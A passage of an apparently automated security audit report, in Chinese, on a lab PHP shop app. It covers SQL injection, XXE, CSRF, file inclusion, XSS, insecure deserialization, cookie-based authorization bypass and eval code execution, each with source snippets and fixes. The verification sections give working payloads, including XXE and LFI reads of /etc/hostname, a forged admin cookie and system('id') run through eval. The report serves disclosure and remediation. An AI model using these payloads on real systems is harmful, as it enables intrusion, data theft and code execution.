   17      if ($sid !== null && preg_match('/^[a-zA-Z0-9,-]{16,64}$/D', $sid)) session_id($sid);
   18      session_start();
```

### C-19 ops/members.php 会员查询参数 q 经 member_lookup 拼接进 SQL 造成注入

- 当前版本：finding `6ea737d111da4451a1c0cbab2c63aa92` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/src/member_lookup.php:3`；文件：`lab30-shop/app/public/ops/members.php`
- 证据引用：`12d724d86e16c5f7` lab30-shop/app/public/ops/members.php:1-4；`4d2f2da581629f05` lab30-shop/app/src/member_lookup.php:1-4；`6220461f4c36cb1a` lab30-shop/app/src/bootstrap.php:33-36
- 根因类别：task_goal:v2:84a53eab2ea6ce9b4f53:1（规范类型 sqli）

**结论陈述（模型产出，不是证据）**

ops/members.php:2 读取 $_GET['q'] 并传入 member_lookup()；src/member_lookup.php:3 将 $term 用字符串拼接进 "SELECT ... WHERE username LIKE '%" . $term . "%'" 后由 db()->query 执行，无参数绑定或转义，持有 operator/admin 会话者可注入任意 SQL 读取/篡改用户表。

- 攻击前身份与适用前提：需持有 operator 或 admin 角色的有效登录会话；GET 请求无需 CSRF 令牌
- 入口 → 传播 → 危险操作/状态变更：GET 参数 q（ops/members.php） → q -> $term -> member_lookup($term) -> 拼接 SQL -> db()->query -> fetchAll -> 回显/JSON 返回 → db()->query 执行字符串拼接的 SELECT
- 防护与边界：仅 require_user(['operator','admin']) 的会话与角色校验，无 SQL 参数化或转义
- 静态判读：证据已记录
- 动态验证：动态确认（verification `b9a479ce0a054a29aa015a892bc98455`）
- 正式终审：独立批次 f35246a81702484ea43871c21d2cd784；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

仅将 q 改为引号+OR 1=1+注释，200 返回多名成员且包含 bob；原筛选条件被改变。

- 评分依据：CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：member_lookup 改用 db()->prepare('... LIKE ?') 并以 '%'.$term.'%' 绑定参数。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/members.php:1-4`（sha256 `aef140c3800b9cf1…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require __DIR__.'/../../src/member_lookup.php';require_user(['operator','admin']);$term=(string)($_GET['q']??'alice');$rows=member_lookup($term);
    3  if(str_contains($_SERVER['HTTP_ACCEPT']??'','application/json'))json_response(['members'=>$rows]);
    4  page('会员查询',function()use($rows,$term){echo '<section class="panel"><form method="get">';form_input('q','会员名',$term);echo '<button>查询会员</button></form><table><thead><tr><th>编号</th><th>用户名</th><th>邮箱</th><th>角色</th></tr></thead><tbody>';foreach($rows as$r)echo '<tr><td>'.h($r['id']).'</td><td>'.h($r['username']).'</td><td>'.h($r['email']).'</td><td>'.h($r['role']).'</td></tr>';echo '</tbody></table></section>';},'运营工作台');
```

`lab30-shop/app/src/member_lookup.php:1-4`（sha256 `eb704332329d4530…`）

```php
    1  <?php
    2  function member_lookup(string $term): array {
    3      return db()->query("SELECT id,username,email,role FROM users WHERE username LIKE '%" . $term . "%'")->fetchAll();
    4  }
```

`lab30-shop/app/src/bootstrap.php:33-36`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
```

### C-20 运营 XML 导入以 LIBXML_NOENT|LIBXML_DTDLOAD 解析用户 XML 导致 XXE

- 当前版本：finding `8af981c796814905b9bdd25108e47ddb` revision 1（项目版本 32）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/xml-import.php:3`；文件：`lab30-shop/app/public/ops/xml-import.php`
- 证据引用：`c7321e7900aae64d` lab30-shop/app/public/ops/xml-import.php:2-4；`6220461f4c36cb1a` lab30-shop/app/src/bootstrap.php:33-36
- 根因类别：task_goal:v2:6c11613e2933d3e6f3ec:1（规范类型 xxe）

**结论陈述（模型产出，不是证据）**

ops/xml-import.php 第3行将 POST 提交的原始 XML 交给 simplexml_load_string，并传入 LIBXML_NOENT（替换实体）与 LIBXML_DTDLOAD（加载外部 DTD），且未设置 LIBXML_NONET，构造 DTD 外部实体即可在解析阶段读取本地/内部资源；解析结果 $doc->title 在第3行取回并在第4行 <pre> 输出，h() 只做 HTML 实体编码，不会阻止服务端实体读取，攻击者可直接获得内容。第2行 require_user(['operator','admin']) 与第3行 check_csrf 只构成必要的账号与 CSRF 前提。

- 攻击前身份与适用前提：攻击者持有 operator 或 admin 有效会话并取得 CSRF 令牌；服务器 libxml 支持外部实体解析且网络/文件权限如默认配置
- 入口 → 传播 → 危险操作/状态变更：POST 参数 xml → $_POST['xml'] -> $xml -> simplexml_load_string(..., LIBXML_NOENT&#124;LIBXML_DTDLOAD) -> $doc->title -> $output -> 第4行 h($output) 输出 → simplexml_load_string 启用了外部实体与外部 DTD 加载的 XML 解析
- 防护与边界：入口有 require_user 角色校验与 check_csrf；输出使用 h()。均不限制 XML 外部实体解析（未用 LIBXML_NONET，未禁用实体）。
- 静态判读：缺上下文（2 项）；缺失上下文：运行时 allow_url_fopen 与 libxml 版本/外部实体加载配置未包含在快照，影响动态触发细节；服务器网络拓扑与内部服务可达性未知
- 动态验证：动态确认（verification `11b1708c52904e50ba94b3cf44f7faf5`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧作业 b1bf9a1812d643ea986a24add093c905（operator，新会话取 csrf）：POST xml=<?xml version="1.0"?><!DOCTYPE config [<!ENTITY a SYSTEM "file:///var/lib/shop/vault/internal.txt"><!ENTITY b SYSTEM "file:///etc/hostname">]><config><title>&a;&#124;&b;</title></config>，返回 200、无格式错误；<pre> 内容为 'SHOP_INTERNAL_dc5a0e5ff0bb785dde68b86e\n&#124;81ca09b06138\n'（MARKER_IN_PRE 与 HOSTNAME_IN_PRE 均为 True）。即两个外部实体的取值在解析阶段被读出并替换进 title，再经 h() 输出；textarea 中虽有 payload 原文（TEXTAREA_ECHO_HAS_FILE_URL True），但文件内容只出现在 <pre>。

- 评分依据：CVSS 3.1 待评分；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：使用 simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NONET) 并显式关闭实体替换（不传 LIBXML_NOENT/LIBXML_DTDLOAD，PHP 8 起依赖 libxml_disable_entity_loader 已移除时改用 LIBXML_NONET 且不启用 DTD）；对不需要 DTD 的配置导入，解析前用白名单校验节点结构，禁止 DOCTYPE。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/xml-import.php:2-4`（sha256 `3c23a76b1047f734…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$output='';$xml='';
    3  if($_SERVER['REQUEST_METHOD']==='POST'){check_csrf();$xml=(string)($_POST['xml']??'');libxml_use_internal_errors(true);$doc=simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT|LIBXML_DTDLOAD);if(!$doc)fail_request('XML 格式不正确。');$output=(string)$doc->title;}
    4  page('合作方配置导入',function()use($output,$xml){echo '<section class="panel"><form method="post">'.csrf_field().'<label>XML 配置<textarea name="xml" required>'.h($xml?:'<config><title>春日上新</title></config>').'</textarea></label><button>导入配置</button></form><h2>导入结果</h2><pre>'.h($output).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:33-36`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
```

### C-21 邮箱设置接口缺失 CSRF 校验，可被跨站请求伪造修改受害者邮箱

- 当前版本：finding `13160cf2233d456381d1bb93c4cebd70` revision 1（项目版本 12）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/account/settings.php:5`；文件：`lab30-shop/app/src/bootstrap.php`
- 证据引用：`4eba9252f833f919` lab30-shop/app/src/bootstrap.php:38-40；`06e77bb1ca712323` lab30-shop/app/src/bootstrap.php:16-16；`bd5a7bd685d6990b` lab30-shop/app/public/account/settings.php:3-8；`276ee5490bb6c42b` lab30-shop/app/public/account/settings.php:5-5
- 根因类别：task_goal:v2:710256b6cdbcbbdc729c:1（规范类型 csrf）

**结论陈述（模型产出，不是证据）**

settings.php 第3-5 行在 POST 时直接取 $_POST['email'] 并 UPDATE users SET email WHERE id=当前会话用户，但从未调用 check_csrf()，第8行表单也未通过 csrf_field() 注入令牌。同一 bootstrap 的其它账户写操作（update.php:4、redeem.php:4、backup.php:4）都调用 check_csrf()，且 bootstrap.php:40 的 hash_equals 校验是唯一令牌防线，这里完全缺失。攻击者只需诱导已登录用户提交跨站表单即可把其邮箱改为攻击者地址，后续可用于账号找回/接管。

- 攻击前身份与适用前提：受害者已登录并持有有效会话；攻击者能诱导其浏览器发起对 /account/settings.php 的 POST；隐私/安全浏览器策略未额外阻断该请求
- 入口 → 传播 → 危险操作/状态变更：跨站 HTML 表单提交 email=attacker@example.com 到 /account/settings.php，浏览器携带受害者会话 Cookie → 攻击者页面自动提交表单 -> 受害者浏览器带 SHOPSESSID（SameSite=Lax）发出 POST -> settings.php 无 check_csrf 直接写库 → 无 CSRF 令牌即执行 UPDATE users SET email=? WHERE id=当前用户
- 防护与边界：bootstrap.php:16 设置 samesite=Lax，可阻止多数跨站 POST 携带 Cookie，但同站/窗口打开等场景仍有残余；应用层唯一令牌防线 check_csrf 在此缺失
- 静态判读：证据已记录
- 动态验证：动态确认（verification `a47d75daaef64bbebd4a9aac5307402d`）
- 正式终审：独立批次 f35246a81702484ea43871c21d2cd784；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击 POST /account/settings.php（alice 已认证会话，body 仅 email=attacker-csrf%4013160.example.com，无 csrf 字段，job 56cdfea879494ce3a339a8d5b6fe5ba7）：200，正文出现“邮箱已更新。”且表单 value 已变为 attacker-csrf@13160.example.com。独立读回 GET /account/settings.php（job 5b83fb6c259643b080c395a900c1a12b）：200，value="attacker-csrf@13160.example.com"，确认写入已持久化到数据库而非仅响应回显。对照的 update.php 无令牌同请求为 403，二者差异直接定位到 settings.php 缺失 check_csrf()。

- 评分依据：CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：在 settings.php POST 分支入口调用 check_csrf()，并在表单中输出 csrf_field()；同时可考虑将 SameSite 设为 Strict 并对邮箱变更做二次确认。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/src/bootstrap.php:38-40`（sha256 `2050819d093be02b…`）

```php
   38  function csrf_token(): string { start_session(); return $_SESSION['csrf'] ??= bin2hex(random_bytes(24)); }
   39  function csrf_field(): string { return '<input type="hidden" name="csrf" value="' . h(csrf_token()) . '">'; }
   40  function check_csrf(): void { if (!hash_equals(csrf_token(), (string)($_POST['csrf'] ?? ''))) fail_request('页面已过期，请刷新后重试。', 403); }
```

`lab30-shop/app/src/bootstrap.php:16-16`（sha256 `2050819d093be02b…`）

```php
   16      session_set_cookie_params(['httponly' => true, 'samesite' => 'Lax', 'path' => '/']);
```

`lab30-shop/app/public/account/settings.php:3-8`（sha256 `f54949d62e46b9ca…`）

```php
    3  if($_SERVER['REQUEST_METHOD']==='POST'){
    4      $email=(string)($_POST['email']??'');if(!filter_var($email,FILTER_VALIDATE_EMAIL))fail_request('请输入有效邮箱。');
    5      db()->prepare('UPDATE users SET email=? WHERE id=?')->execute([$email,$u['id']]);event_log('update_email',['email'=>$email]);$u['email']=$email;$notice='邮箱已更新。';
    6      if(str_contains($_SERVER['HTTP_ACCEPT']??'','application/json'))json_response(['email'=>$email,'updated'=>true]);
    7  }
    8  page('邮箱设置',function()use($u,$notice){echo '<section class="panel narrow">';if($notice)echo '<div class="notice">'.h($notice).'</div>';echo '<form method="post">';form_input('email','常用邮箱',$u['email'],'email');echo '<button>保存邮箱</button></form></section>';},'账户与会员');
```

`lab30-shop/app/public/account/settings.php:5-5`（sha256 `f54949d62e46b9ca…`）

```php
    5      db()->prepare('UPDATE users SET email=? WHERE id=?')->execute([$email,$u['id']]);event_log('update_email',['email'=>$email]);$u['email']=$email;$notice='邮箱已更新。';
```

### C-22 运营模板预览页面将 $_GET['template'] 裸变量传入 include 导致任意本地文件包含（可延伸 RFI）

- 当前版本：finding `264f7c68e27b4d749e1ecf9b3205317c` revision 1（项目版本 13）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/template-preview.php:3`；文件：`lab30-shop/app/public/ops/template-preview.php`
- 证据引用：`5d596a817dad3c10` lab30-shop/app/public/ops/template-preview.php:1-3；`78224482780bf94a` lab30-shop/app/src/bootstrap.php:33-37
- 根因类别：task_goal:v2:eeaa7c25fb0f4c22f5d9:1（规范类型 lfi）

**结论陈述（模型产出，不是证据）**

template-preview.php:2 从查询参数 template 读取任意字符串，第3行 `if($template!=='')include $template;` 直接以该字符串为 include 操作数。页面仅要求 operator/admin 角色（bootstrap.php:33-37），但没有任何针对路径的白名单、basename、realpath 或前缀约束，也没有限制允许的包装协议。操作者可指定相对或绝对路径包含服务器上的任意可读 PHP/文件；当 PHP 配置 allow_url_include=On 时同一 sink 还可包含远程 URL。

- 攻击前身份与适用前提：需要已登录且角色为 operator 或 admin 的账号；allow_url_include 开启是 RFI 形态的额外运行时前提，LFI 形态不依赖该配置
- 入口 → 传播 → 危险操作/状态变更：HTTP GET 参数 template（$_GET['template']） → $_GET['template'] -> (string) 强转 -> 闭包 use($template) -> include $template 执行包含 → include $template（动态文件包含）
- 防护与边界：require_user 仅做角色校验；include 操作数无白名单、无路径规范化、无协议限制
- 静态判读：缺上下文（1 项）；缺失上下文：运行时 PHP 配置 allow_url_include 与 open_basedir 值未在快照中，仅影响 RFI 形态与包含范围，不影响 LFI 结论
- 动态验证：动态确认（verification `43618c5a9f2044babb37c14b87fb173d`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧作业 f1cf58c683ab47f886930ddea507512c（operator）：把 template 换成 /var/lib/shop/vault/internal.txt，GET /ops/template-preview.php 返回 200，<section id="remote-template"> 内容为 'SHOP_INTERNAL_db428cd2e756cf7a93a69244\n'（MARKER_IN_BODY True）；用 file:///var/lib/shop/vault/internal.txt 得到同一标记，用 file:///etc/hostname 得到 '81ca09b06138\n'。即 include 操作数可指向应用目录之外任意可读文件，且 file:// 等包装协议未被限制，读出了本不应暴露的内部标记与系统文件。

- 评分依据：CVSS 3.1 Base 8.3 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：不要以用户输入作为 include 操作数；改为固定白名单映射（如 template 键 -> 预定义绝对路径），并用 realpath 校验结果位于允许目录内，禁止 http/https 等包装协议。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/template-preview.php:1-3`（sha256 `107da46e9b067ce0…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$template=(string)($_GET['template']??'');
    3  page('远程模板预览',function()use($template){echo '<section class="panel"><form method="get">';form_input('template','模板地址',$template?:'http://fixtures:8080/templates/season.php');echo '<button>加载模板</button></form></section><section class="panel" id="remote-template">';if($template!=='')include $template;echo '</section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:33-37`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
```

### C-23 个人主页预览将 url 参数未编码写入 href 属性，构成反射型 XSS

- 当前版本：finding `4afcafc91e504ef589de6fb97a6b9693` revision 1（项目版本 27）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/account/profile.php:3`；文件：`lab30-shop/app/public/account/profile.php`
- 证据引用：`e1dc06d2f03a80eb` lab30-shop/app/public/account/profile.php:2-3；`1b8b2b99a1a47fee` lab30-shop/app/src/bootstrap.php:46-46
- 根因类别：task_goal:v2:5be7272b7dae0b998209:1（规范类型 xss_r）

**结论陈述（模型产出，不是证据）**

profile.php 第2行直接取 $_GET['url'] 作为 $url，第3行在 page() 回调中用字符串拼接把 $url 原样写入 <a id="profile-link" href="'.$url.'"> 属性，未调用 h() 编码；同一 $url 传入 form_input 时被 h() 编码，仅第二处缺失。攻击者可构造 url 闭合双引号注入事件属性，例如 url=%22%20onmouseover%3Dalert(1)%20x%3D%22 使浏览器渲染 <a href="" onmouseover=alert(1) x="">，受害者点击/悬停即执行脚本。require_user 只保证登录，不限制参数内容。

- 攻击前身份与适用前提：攻击者诱导已登录用户访问构造的 profile.php?url=... 链接
- 入口 → 传播 → 危险操作/状态变更：GET 参数 url → $_GET['url'] → $url → 字符串拼接进入 href 属性输出 → 未 HTML 编码输出到 href 双引号属性，可注入事件处理器
- 防护与边界：同页面 form_input 使用 h() 编码，但 href 拼接处未使用；无 CSP 证据
- 静态判读：证据已记录
- 动态验证：动态确认（verification `00204fe6d4354656ac98d045eafa3a70`）
- 正式终审：独立批次 3fd3ef95e01e450cbd343ba846e87695；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧作业 a62948c210f8444c81319121cbc9936d（alice 已登录浏览器会话）：访问 /account/profile.php?url=%22%3E%3Cimg%20src%3Dx%20onerror%3D%22alert%28%27PWNED-HREF-7Q2Z%27%29%22%3E（即 url=""><img src=x onerror="alert('PWNED-HREF-7Q2Z')">），页面标题仍为个人主页预览，dialogs=["PWNED-HREF-7Q2Z"]，console_errors 含 img src=x 的 404；body_text 中该链接位置显示 '">访问个人主页'，说明 url 未编码地闭合了 href 属性并注入 <img onerror>，浏览器实际弹出对话框。

- 评分依据：CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：使用 h($url) 输出，或对 URL 做协议白名单校验（http/https）后再编码。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/account/profile.php:2-3`（sha256 `6f2406bbf636de04…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();$url=(string)($_GET['url']??$u['homepage']);
    3  page('个人主页预览',function()use($u,$url){echo '<section class="panel"><h2>'.h($u['display_name']).' 的主页</h2><p><a id="profile-link" href="'.$url.'">访问个人主页</a></p><form method="get">';form_input('url','主页链接',$url);echo '<button>预览链接</button></form></section>';},'账户与会员');
```

`lab30-shop/app/src/bootstrap.php:46-46`（sha256 `2050819d093be02b…`）

```php
   46  function form_input(string $name, string $label, string $value = '', string $type = 'text'): void { echo '<label>' . h($label) . '<input name="' . h($name) . '" type="' . h($type) . '" value="' . h($value) . '" required></label>'; }
```

### C-24 会员备份恢复接口对用户输入执行 unserialize 并信任对象字段写入

- 当前版本：finding `a47fd652debb4f0391fe234a5d91ecd6` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/account/backup.php:5`；文件：`lab30-shop/app/public/account/backup.php`
- 证据引用：`52a7b68bba8b1c1f` lab30-shop/app/public/account/backup.php:4-6；`9d0d13b19a80b9a2` lab30-shop/app/src/backup.php:2-5
- 根因类别：task_goal:v2:a38aaf352b986716fabc:1（规范类型 insecure_deserialization）

**结论陈述（模型产出，不是证据）**

account/backup.php 在 POST 时取 $_POST['backup'] 做 base64_decode(...,true)，再对该字节串调用 unserialize($raw)，仅检查 instanceof MemberBackup 后用 $restored->tier 与 $restored->displayName 写入 users 表。攻击者完全控制序列化字符串，可构造 MemberBackup 对象把 tier 设为 gold 或把 display_name 设为任意内容；此外 unserialize 作用于不可信数据，若后续加载含魔术方法的类即可触发对象注入。

- 攻击前身份与适用前提：攻击者拥有任意已登录账户；能取得有效 CSRF 令牌。
- 入口 → 传播 → 危险操作/状态变更：已登录用户的 POST 参数 backup（base64 编码的序列化字符串） → 未记录 → unserialize($raw) 后 UPDATE users SET tier=?,display_name=?
- 防护与边界：check_csrf 只防跨站提交；instanceof MemberBackup 不能保证字段值可信；MemberBackup 无签名/完整性校验。
- 静态判读：证据已记录
- 动态验证：动态确认（verification `16ca1673ec1246e9b3b05450bd389978`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

作业 d587de55af6f4f369edf4cf7e28e0442（alice，新会话重新登录并取 csrf）：BEFORE_ATTACK_INDEX 200 ('standard','林晓','普通会员…')；仅替换 backup 字段为 base64(O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:16:"PWNED-DESER-7Q2Z";}) = TzoxMjoiTWVtYmVyQmFja3VwIjoyOntzOjQ6InRpZXIiO3M6NDoiZ29sZCI7czoxMToiZGlzcGxheU5hbWUiO3M6MTY6IlBXTkVELURFU0VSLTdRMloiO30=；ATTACK_POST_STATUS 200、ATTACK_POST_NOTICE True、ATTACK_POST_INVALID False；AFTER_ATTACK_INDEX 200 ('gold','PWNED-DESER-7Q2Z','金卡会员：享受专属折扣与优先服务')，ATTACK_MARKER_IN_BODY True、ATTACK_GOLD True。随后提交合法导出，RESTORE_POST_STATUS 200，读回 ('standard','林晓','普通会员…')。

- 评分依据：CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：改用 JSON 解析并严格校验字段类型与允许值；若必须序列化，应加 HMAC 签名并在 unserialize 时使用 allowed_classes 白名单；tier 变更应走服务端受控逻辑。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/account/backup.php:4-6`（sha256 `017e1703cdf0ff0c…`）

```php
    4      check_csrf();$raw=base64_decode((string)($_POST['backup']??''),true);if($raw===false)fail_request('备份格式不正确。');
    5      $restored=unserialize($raw);if(!$restored instanceof MemberBackup)fail_request('不是有效的会员备份。');
    6      db()->prepare('UPDATE users SET tier=?,display_name=? WHERE id=?')->execute([$restored->tier,$restored->displayName,$u['id']]);event_log('restore_member_backup');$notice='会员备份已恢复。';
```

`lab30-shop/app/src/backup.php:2-5`（sha256 `571459cc8b0f6e8e…`）

```php
    2  class MemberBackup {
    3      public string $tier = 'standard';
    4      public string $displayName = '会员';
    5  }
```

### C-25 ops/users.php 用客户端 Cookie role 判定管理员，登录用户可伪造越权读取全部用户

- 当前版本：finding `f434cb50f3c5481db935aaf727023338` revision 1（项目版本 32）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/users.php:2`；文件：`lab30-shop/app/public/ops/users.php`
- 证据引用：`512c66e6f8b9519d` lab30-shop/app/public/ops/users.php:2-2；`15eb2a96e150221e` lab30-shop/app/public/ops/users.php:3-3；`e84191827e1714cf` lab30-shop/app/public/ops/users.php:4-5；`6220461f4c36cb1a` lab30-shop/app/src/bootstrap.php:33-36；`9d62b8b1257e5f2a` lab30-shop/app/src/bootstrap.php:20-25
- 根因类别：task_goal:v2:6195d0f0aaa21bb06ad7:1（规范类型 auth_bypass）

**结论陈述（模型产出，不是证据）**

users.php 第2行从 $_COOKIE['role'] 读取角色并与 'admin' 比较，Cookie 完全由客户端控制，任何登录用户可在请求中加 Cookie: role=admin 绕过服务端角色，触达第3行全表用户查询及第4/5行输出，泄露全部用户 id、username、email、role。require_user() 仅校验登录，未做管理员校验；bootstrap 的 user() 从数据库取角色但第2行直接用 Cookie 覆盖，形成独立授权缺陷。

- 攻击前身份与适用前提：需持有一个可登录的账号（operator 或普通用户）；请求附带 Cookie role=admin；无需真实管理员会话。
- 入口 → 传播 → 危险操作/状态变更：未记录 → Cookie role -> $role 变量 -> 第2行 if ($role!=='admin') 放行 -> 第3行 SELECT ... FROM users ORDER BY id -> 第4/5行输出/渲染 → 以客户端可伪造 Cookie 控制管理员授权，随后读取并回显全部用户账号与角色。
- 防护与边界：require_user() 只验证登录与可选服务端角色列表（bootstrap.php:33-36），本页未传入 ['admin']；Cookie 未做签名/会话绑定，$u['role'] 被 Cookie 覆盖，服务端角色检查被绕过。
- 静态判读：证据已记录
- 动态验证：动态确认（verification `dcdc95778f704629b39fd082a138ce82`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧（宿主审计执行作业 646b342c9e6b4d9d94153ead8b6ca80c，alice 登录会话）：同一会话在请求中附加 Cookie: role=admin 后 GET /ops/users.php，返回 200 与 {"access":"admin","users":[{"id":1,"username":"alice","email":"alice@shop.local","role":"customer"},{"id":2,"username":"bob",...},{"id":3,"username":"operator","email":"ops@shop.local","role":"operator"},{"id":4,"username":"admin","email":"admin@shop.local","role":"admin"}]}，即普通 customer 会话经伪造 Cookie 获得管理员标注并读取全部用户 id/username/email/role。同一作业中不带该 Cookie 的请求为 403“人员管理需要管理员权限。”

- 评分依据：CVSS 3.1 待评分；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：删除基于 $_COOKIE['role'] 的角色判断，改为 require_user(['admin']) 使用服务端会话角色；对管理接口做服务端角色与对象级鉴权，Cookie 不参与授权。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/users.php:2-2`（sha256 `3c5e879d945650ba…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();$role=(string)($_COOKIE['role']??$u['role']);if($role!=='admin')fail_request('人员管理需要管理员权限。',403);
```

`lab30-shop/app/public/ops/users.php:3-3`（sha256 `3c5e879d945650ba…`）

```php
    3  $rows=db()->query('SELECT id,username,email,role FROM users ORDER BY id')->fetchAll();
```

`lab30-shop/app/public/ops/users.php:4-5`（sha256 `3c5e879d945650ba…`）

```php
    4  if(str_contains($_SERVER['HTTP_ACCEPT']??'','application/json'))json_response(['access'=>'admin','users'=>$rows]);
    5  page('人员与权限管理',function()use($rows){echo '<section class="panel"><span class="badge">管理员工作区</span><h2>账户权限清单</h2><table><thead><tr><th>用户名</th><th>邮箱</th><th>角色</th></tr></thead><tbody>';foreach($rows as$r)echo '<tr><td>'.h($r['username']).'</td><td>'.h($r['email']).'</td><td>'.h($r['role']).'</td></tr>';echo '</tbody></table></section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:33-36`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
```

`lab30-shop/app/src/bootstrap.php:20-25`（sha256 `2050819d093be02b…`）

```php
   20  function user(): ?array {
   21      start_session();
   22      if (empty($_SESSION['user_id'])) return null;
   23      $q = db()->prepare('SELECT id,username,display_name,email,role,balance,tier,nickname,homepage FROM users WHERE id=?');
   24      $q->execute([$_SESSION['user_id']]); return $q->fetch() ?: null;
   25  }
```

### C-26 营销模板渲染将双花括号内容传入 eval 造成代码执行

- 当前版本：finding `f559f9fc049449178215238868ce4fb4` revision 1（项目版本 33）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/template-render.php:3`；文件：`lab30-shop/app/public/ops/template-render.php`
- 证据引用：`136d02a92a08ac98` lab30-shop/app/public/ops/template-render.php:1-4；`063c928d2d7c3b2e` lab30-shop/app/src/bootstrap.php:33-40
- 根因类别：task_goal:v2:4e7190b2cf807b43a97d:1（规范类型 code_execution）

**结论陈述（模型产出，不是证据）**

ops/template-render.php 第3行对 $_POST['template'] 用 preg_replace_callback 提取 {{...}} 内表达式并直接 eval('return '.$m[1].';')，攻击者可注入任意 PHP 代码。虽然通过 check_csrf 与 require_user(['operator','admin'])，但该漏洞本身允许在服务端执行任意代码。

- 攻击前身份与适用前提：已登录 operator/admin 角色账号并能获取 CSRF token
- 入口 → 传播 → 危险操作/状态变更：$_POST['template'] → POST template -> preg_replace_callback 匹配 {{...}} -> eval 执行表达式 → eval('return '.$m[1].';')
- 防护与边界：check_csrf 仅防 CSRF，不过滤表达式内容
- 静态判读：证据已记录
- 动态验证：动态确认（verification `035ed525a281444eaee7a18f8d02f2da`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧作业 198da608b63a4654a7b53b547ef74cd3（operator）：模板改为 {{ system('echo PWNED-EVAL-7Q2Z; id') }}，POST 200。响应在 <!doctype html> 之前出现执行输出 'PWNED-EVAL-7Q2Z\nuid=33(www-data) gid=33(www-data) groups=33(www-data)'（ATTACK_EXEC_CONTEXT 原文），<pre> 内容为 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'（ATTACK_UID True），即 eval 内 system() 被实际执行；textarea 中模板文本的 h() 转义回显（ATTACK_TEMPLATE_ECHOED_ESCAPED True）不产生 uid 输出。

